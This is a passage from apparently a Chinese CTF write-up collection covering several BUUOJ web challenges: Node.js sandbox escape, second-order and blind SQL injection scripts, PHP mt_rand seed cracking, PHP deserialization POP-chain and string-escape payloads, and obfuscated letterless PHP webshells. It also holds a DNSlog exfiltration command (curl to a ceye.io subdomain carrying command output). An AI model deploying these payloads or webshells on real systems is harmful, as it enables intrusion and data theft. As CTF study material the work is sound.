&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)() join的作用： 还有另一种绕过方式 &#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; 把所有被过滤的字符按这个方式改写就行 (function ()&#123; TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)(); try&#123; Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1; &#125;catch(e)&#123; return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString(); &#125; &#125;)() [网鼎杯2018]Unfinish进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录 整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入 information，逗号还有其他很多都被过滤了 只能用from for代替逗号，直接猜表名是flag 确定之后写脚本跑flag import re from time import sleep import requests flag &#x3D; &#39;&#39; url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39; payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39; for i in range(1000): sleep(0.3) data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data) r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1) res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;&#x2F;span&gt;&#39;, r2.text) res1 &#x3D; re.search(r&#39;\\d+&#39;, res.group()) flag &#x3D; flag + chr(int(res1.group())) print(flag) [GXYCTF2019]StrongestMind写脚本执行运算就行 import re import requests from time import sleep # url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39; req &#x3D; requests.session() response &#x3D; req.get(url) for i in range(1001): math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text) data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125; response &#x3D; req.post(url, data&#x3D;data) print(i,data) response.encoding &#x3D; &quot;utf-8&quot; print(response.text) sleep(0.1) 唯一要注意的就是要先用request.session()保持会话 [MRCTF2020]Ezauditphp的伪随机，和前边一道题很像 看到www.zip，下载下来看看源码 if(isset($_POST[&#39;login&#39;]))&#123; $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; $Private_key &#x3D; $_POST[&#39;Private_key&#39;]; if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123; &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else if($Private_key !&#x3D; &#39;*************&#39; ) &#123; header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123; $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;; $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result &#x3D; mysql_query($getuser); while($row&#x3D;mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125; &#125; &#x2F;&#x2F; genarate public_key function public_key($length &#x3D; 16) &#123; $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $public_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; &#x2F;&#x2F;genarate private_key function private_key($length &#x3D; 12) &#123; $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $private_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key &#x3D; public_key(); &#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key??? 给了一个公钥，我们来试试求私钥 两个脚本用那个都行，把输出的结果放到php_mt_seed里求求种子 得到种子之后就能得到私钥的值了 对于密码这部分可以直接用万能密码 登录拿到flag [网鼎杯]track_hacker不是buu的题，也没啥难度，就是记录一下这种解码的方式 用python2解码 如果用python3要用这种写法 duangShell主要是记录一下利用dnslog外带的方法 &lt;!DOCTYPE html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;give me a girl&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;?php error_reporting(0); echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;; if (!isset($_POST[&#39;girl_friend&#39;])) &#123; die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;); &#125; else &#123; $girl &#x3D; $_POST[&#39;girl_friend&#39;]; if (preg_match(&#39;&#x2F;\\&gt;|\\\\\\&#x2F;&#39;, $girl)) &#123; die(&#39;just girl&#39;); &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$&#x2F;i&#39;, $girl)) &#123; echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; &#x2F;&#x2F;duangShell~~~~ exec($girl); &#125; &#125; 可以看到post的girl_friend值绕过过滤之后直接命令执行，但是这里是exec不存在回显，所以可以进行反弹shell，或者利用dnslog外带命令 http://ceye.io/ curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;反引号内执行命令&#96; 既然能执行命令，那我们就可以用find找flag文件名然后查看，或者直接grep找内容，但是如果从根目录开始找buu的靶机好像跑不动，会显示超时 或者用grep直接带出flag 注意的是这种外带一次只能显示一条数据，所以可能会匹配到其他的文件，如果想查看其他数据，就要利用sed命令 tips：这种方法可以用于sql盲注，但是前提是必须有FILE权限、secure_file_priv为空而不是NULL（不为空就只能读限定目录的文件） [GYCTF2020]Easyphp在update界面，即使没有成功登录也会继续执行下面的调用update方法的语句 重点在lib.php中，这里面有两个__destruct方法，我们要利用的是UpdateHelper类中的__destruct,这是我们反序列化的起点 但是我们先来看看dbCtrl类 class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 能看出数据库中是存在admin用户的，但是密码我们不知道，这里的sql查询语句为select id,password from user where username=?如果能控制这里的sql执行语句为select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?便可经过登陆的密码验证，这个操作是可以实现的c4ca4238a0b923820dcc509a6f75849b是1的MD5值 这是sql创造临时列的一种方法，如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，第一列是数据库中的数据，第二列是添加的临时列1 class User &#123; public $id; public $age&#x3D;null; public $nickname&#x3D;null; public function login() &#123; if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123; $mysqli&#x3D;new dbCtrl(); $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;); if($this-&gt;id)&#123; $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id; $_SESSION[&#39;login&#39;]&#x3D;1; echo &quot;你的ID是&quot;.$_SESSION[&#39;id&#39;]; echo &quot;你好！&quot;.$_SESSION[&#39;token&#39;]; echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;; return $this-&gt;id; &#125; &#125; &#125; public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;这里如果我们将nickname实例化为info类的对象，那么tostring执行的时候就相当于调用一个info类中不存在的方法，也就会调用info类中的__call方法 return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age&#x3D;$age; $this-&gt;nickname&#x3D;$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;call方法的两个参数分别是方法名和方法参数，也就是说这个argument就是user类的age属性，是我们可以控制的。然后我们将CtrlCase实例化为dbCtrl类的对象，就能调用dbCtrl类的login方法，再通过控制user类的age，实现对sql语句的控制 &#125; &#125; Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo&#x3D;unserialize($newInfo); $upDate&#x3D;new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql;&#x2F;&#x2F;将sql实例化为User类的对象，在该类被结束销毁时调用User::__toString方法函数 &#125; &#125; class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 所以pop链为UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql) 反序列化脚本为 &lt;?php class User &#123; public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ; public $nickname; public function __construct() &#123; $this -&gt; nickname &#x3D; new Info(); &#125; public function __toString(): string &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;CtrlCase &#x3D; new dbCtrl(); &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125; &#125; Class UpdateHelper&#123; public $sql; public function __construct()&#123; $this -&gt;sql &#x3D; new User(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125; &#125; class dbCtrl &#123; public function __construct() &#123; $this-&gt;name&#x3D;&#39;admin&#39;; $this-&gt;password&#x3D;&#39;1&#39;; &#125; public function login($sql) &#123; &#125; &#125; $a &#x3D; new UpdateHelper(); echo serialize($a); &#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125; 正常情况下的序列化内容 我们要把我们的序列化结果插入到2的位置 可以看到插入后他只能被作为nickname的值，所以我们就要利用反序列化的字符逃逸，利用safe函数中将union替换为六个字母的hacker实现逃逸，两个箭头之内的值的数量就是我们要添加的union的值 payload: age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; 然后用户名为admin，密码为1登录即可 [SUCTF 2018]GetShell 很明显是传个一句话上去，但是他会对文件内容从第六位开始进行黑名单检测，用bp简单fuzz一下 括号还有取反符号都没被过滤，参考一下p牛的文章 一些不包含数字和字母的webshell | 离别歌 (leavesongs.com) 方法一 在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 方法二 和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。 方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如&#39;和&#39;&#123;2&#125;的结果是&quot;\\x8c&quot;，其取反即为字母s： 方法三 &lt;?php $_&#x3D;[]; $_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;; $_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0]; $___&#x3D;$_; &#x2F;&#x2F; A $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.&#x3D;$__; &#x2F;&#x2F; S $___.&#x3D;$__; &#x2F;&#x2F; S $__&#x3D;$_; $__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $___.&#x3D;$__; $____&#x3D;&#39;_&#39;; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $____.&#x3D;$__; $_&#x3D;$$____; $___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]); 这题里取反符号没被过滤，那我们就用第二种方法 可以看到我们可以利用数组的方式从汉字的取反值里读出一个字母 找篇p牛的文章跑一下 &lt;?php $dome &#x3D; &#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。 前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。 旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。 当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。 我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。 生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不惊。 远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。 去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。 我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。 这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。 颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。 昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。 说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。 有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。 人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。 那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。 后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。 来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。 站在屋顶的我，喝下杯中最后一口水。 清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。 不知不觉我又想到辜鸿铭与沈子培的那段对话。 “大难临头，何以为之？” “世受国恩，死生系之。”&#39;; for($i &#x3D;0 ; $i &lt; 1000 ; $i++) &#123; $sub_str &#x3D; mb_substr($dome, $i, 1); echo $sub_str.&#39;&#x3D;&#39;.~($sub_str)[1]; echo &quot;\\r\\n&quot;; &#125; 我们想构造system（这里不构造eval的原因是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，.. 然后把我们想要的字母找出来 北&#x3D;s 冲&#x3D;y 北&#x3D;s 择&#x3D;t 的&#x3D;e 和&#x3D;m 说&#x3D;P 小&#x3D;O 笔&#x3D;S 站&#x3D;T 好了，但是1是数字，显然不能直接用，所以还要尝试利用php的特性获得1 最终payload &lt;?&#x3D;$__&#x3D;[];$___&#x3D;[];$_&#x3D;$__&#x3D;&#x3D;$___;$____&#x3D;~(北)[$_].~(冲)[$_].~(北)[$_].~(择)[$_].~(的)[$_].~(和)[$_];$_____&#x3D;_.~(说)[$_].~(小)[$_].~(笔)[$_].~(站)[$_];$____($$_____[$____]); php传上去直接给注释了，所以可以用短标签 flag在环境变量里 [SCTF2019]Flag Shop点进去之前我还以为是个条件竞争。。。 钱显然不够买flag的，点work可以增加，但是这道题显然不是为了测脚本编写水平的 网站存在jwt 解码看一下 但是这里有着我们不知道的密钥，那么下面就是想办法获取密钥把jwt里的jkl值改大，购买flag就行了 网站存在robots.txt，访问一下看到filebak路径 require &#39;sinatra&#39; require &#39;sinatra&#x2F;cookies&#39; require &#39;sinatra&#x2F;json&#39; require &#39;jwt&#39; require &#39;securerandom&#39; require &#39;erb&#39; set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39; FLAGPRICE &#x3D; 1000000000000000000000000000 ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64) configure do enable :logging file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;) file.sync &#x3D; true use Rack::CommonLogger, file end get &quot;&#x2F;&quot; do redirect &#39;&#x2F;shop&#39;, 302 end get 